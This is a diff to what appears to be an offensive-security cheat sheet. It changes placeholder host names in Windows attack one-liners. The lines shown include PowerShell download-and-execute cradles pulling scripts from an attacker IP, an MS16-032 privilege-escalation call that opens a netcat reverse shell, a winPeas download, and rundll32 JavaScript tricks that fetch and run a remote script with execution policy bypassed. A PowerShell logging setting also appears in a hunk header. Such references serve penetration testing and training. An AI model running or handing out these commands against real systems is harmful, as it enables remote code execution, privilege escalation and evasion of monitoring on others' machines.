@@ -272,7 +272,7 @@
 - findstr = grep
 - 
 ### Windows: get file
-  - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
+  - powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
     - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
 
   - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://Attcker/File
@@ -809,7 +809,7 @@ $snap.LogPipelineExecutionDetails = $false
 - **Rundll32**
   -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
   -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert(123)
-  -  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+  -  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP:PORT/script.ps1');");
 
 - **Regsvr32**
   - system32 = 32 bit
